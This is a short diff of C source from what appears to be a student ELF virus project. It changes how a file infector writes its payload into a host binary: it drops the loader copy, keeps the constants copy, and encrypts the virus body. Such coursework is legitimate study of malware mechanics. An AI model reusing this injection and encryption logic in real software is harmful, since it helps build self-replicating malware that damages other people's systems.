@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/27 01:31:31 by anselme          ###   ########.fr       */
+/*   Updated: 2020/01/12 17:46:07 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -77,20 +77,17 @@ bool		setup_payload(struct safe_ptr ref, const struct entry *clone_entry, uint64
 
 	init_constants(&constants, clone_entry, son_seed);
 
-	const size_t	payload_size = (uint64_t)_start - (uint64_t)loader_entry;
 	const size_t	virus_size   = constants.virus_size;
 	const size_t	payload_off  = clone_entry->end_of_last_section;
 	const size_t	virus_off    = payload_off + constants.relative_virus_address;
 	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;
 
-	void	*payload_location    = safe(ref, payload_off, payload_size);
 	void	*constants_location  = safe(ref, payload_off + dist_entry_header, sizeof(constants));
 	void	*virus_location      = safe(ref, virus_off, virus_size);
 
-	if (!payload_location || !constants_location || !virus_location)
+	if (!constants_location || !virus_location)
 		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
 
-	memcpy(payload_location, (void *)loader_entry, payload_size);
 	memcpy(constants_location, &constants, sizeof(constants));
 	cypher(virus_location, virus_size);
 
